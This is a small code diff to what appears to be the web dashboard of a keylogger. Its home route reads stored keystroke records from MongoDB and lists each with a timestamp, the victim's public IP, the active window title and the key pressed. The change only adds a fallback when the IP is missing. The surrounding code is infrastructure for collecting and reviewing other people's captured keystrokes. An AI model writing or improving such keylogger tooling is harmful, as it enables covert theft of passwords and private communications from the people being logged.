@@ -28,7 +28,7 @@ def home():
     keylogs = keylogs_collection.find({})
     # formatted_keylogs = [f"[{log['_id'].generation_time}] ---> {log['text']}" for log in keylogs]
     # formatted_keylogs = [f"[{log['timestamp']}] > {log['window_title']} ---> {log['key_pressed']}" for log in keylogs]
-    formatted_keylogs = [f"[{log['timestamp']}] [{log['public_ip']}] > {log['window_title']} ---> {log['key_pressed']}" for log in keylogs]
+    formatted_keylogs = [f"[{log['timestamp']}] [{log.get('public_ip', 'Unknown IP')}] > {log['window_title']} ---> {log['key_pressed']}" for log in keylogs]
 
     # Fetch site logs from MongoDB
     site_logs = site_logs_collection.find({})
